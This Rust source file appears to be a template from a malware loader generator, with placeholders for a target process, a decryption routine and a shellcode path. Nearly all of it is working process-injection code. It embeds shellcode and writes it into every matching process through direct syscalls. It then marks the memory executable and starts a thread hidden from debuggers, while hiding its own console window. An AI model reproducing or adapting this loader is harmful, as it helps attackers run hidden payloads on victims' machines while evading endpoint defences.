#![windows_subsystem = "windows"]
#![allow(non_snake_case)]

use sysinfo::{System};
use std::include_bytes;
use rust_syscalls::syscall;

use ntapi::ntapi_base::CLIENT_ID;
use ntapi::ntpsapi::THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER;
use std::ptr::null_mut;
use winapi::ctypes::c_void;
use winapi::um::winnt::PAGE_EXECUTE_READWRITE;
use winapi::um::winnt::THREAD_ALL_ACCESS;
use winapi::{
    shared::ntdef::{HANDLE, NT_SUCCESS, OBJECT_ATTRIBUTES},
    um::{
        lmaccess::ACCESS_ALL,
        winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE},
    },
};
//use winapi::um::sysinfoapi::GetPhysicallyInstalledSystemMemory;
use winapi::shared::ntdef::NULL;

{{IMPORTS}}

{{DECRYPTION_FUNCTION}}

fn boxboxbox(tar: &str) -> Vec<usize> {
    // search for processes to inject into
    let mut dom: Vec<usize> = Vec::new();
    let s = System::new_all();
    for pro in s.processes_by_exact_name(tar) {
        //println!("{} {}", pro.pid(), pro.name());
        dom.push(usize::try_from(pro.pid().as_u32()).unwrap());
    }

    dom
}

fn enhance(mut buf: Vec<u8>, tar: usize) {
    // injecting in target processes :)
    let mut process_handle = tar as HANDLE;
    let mut oa = OBJECT_ATTRIBUTES::default();
    let mut ci = CLIENT_ID {
        UniqueProcess: process_handle,
        UniqueThread: null_mut(),
    };

    unsafe {
        let open_status = syscall!(
            "NtOpenProcess",
            &mut process_handle,
            ACCESS_ALL,
            &mut oa,
            &mut ci
        );
        if !NT_SUCCESS(open_status) {
            if cfg!(debug_assertions) {
                println!("[-] Error calling NtOpenProcess: {}", open_status);
                panic!();
            } else {
                panic!();
            }
        }
        let mut allocstart: *mut c_void = null_mut();
        let mut size: usize = buf.len();
        let alloc_status = syscall!(
            "NtAllocateVirtualMemory",
            process_handle,
            &mut allocstart,
            0,
            &mut size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );
        if !NT_SUCCESS(alloc_status) {
            if cfg!(debug_assertions) {
                println!(
                    "[-] Error calling NtAllocateVirtualMemory: {}",
                    alloc_status
                );
                panic!();
            } else {
                panic!();
            }
        }
        let mut byteswritten = 0;
        let buffer = buf.as_mut_ptr() as *mut c_void;
        let mut buffer_length = buf.len();
        let write_status = syscall!(
            "NtWriteVirtualMemory",
            process_handle,
            allocstart,
            buffer,
            buffer_length,
            &mut byteswritten
        );
        if !NT_SUCCESS(write_status) {
            if cfg!(debug_assertions) {
                println!("[-] Error calling NtWriteVirtualMemory: {}", write_status);
                panic!();
            } else {
                panic!();
            }
        }

        let mut old_perms = PAGE_READWRITE;
        let protect_status = syscall!(
            "NtProtectVirtualMemory",
            process_handle,
            &mut allocstart,
            &mut buffer_length,
            PAGE_EXECUTE_READWRITE,
            &mut old_perms
        );
        if !NT_SUCCESS(protect_status) {
            if cfg!(debug_assertions) {
                println!(
                    "[-] Error calling NtProtectVirtualMemory: {}",
                    protect_status
                );
                panic!();
            } else {
                panic!();
            }
        }

        let mut thread_handle: *mut c_void = null_mut();
        let handle = process_handle as *mut c_void;

        let write_thread = syscall!(
            "NtCreateThreadEx",
            &mut thread_handle,
            THREAD_ALL_ACCESS,
            NULL,
            handle,
            allocstart,
            NULL,
            THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
            0_usize,
            0_usize,
            0_usize,
            NULL
        );

        if write_status != 0 {
            if cfg!(debug_assertions) {
                println!("[-] Error calling NtCreateThreadEx: {:#02X}", write_thread);
                panic!();
            } else {
                panic!();
            }
        }
    }
}

fn main() {
    // inject in the following processes:
    let tar: &str = "{{TARGET_PROCESS}}";

    let buf = include_bytes!({{PATH_TO_SHELLCODE}});
    let mut vec: Vec<u8> = Vec::new();
    for i in buf.iter() {
        vec.push(*i);
    }
    let list: Vec<usize> = boxboxbox(tar);
    if list.is_empty() {
        if cfg!(debug_assertions) {
            println!("[-] Unable to find the target process.");
            panic!();
        } else {
            panic!();
        }
    } else {
        for i in &list {
            {{MAIN}}
            enhance(vec.clone(), *i);
        }
    }
}

{{DLL_MAIN}}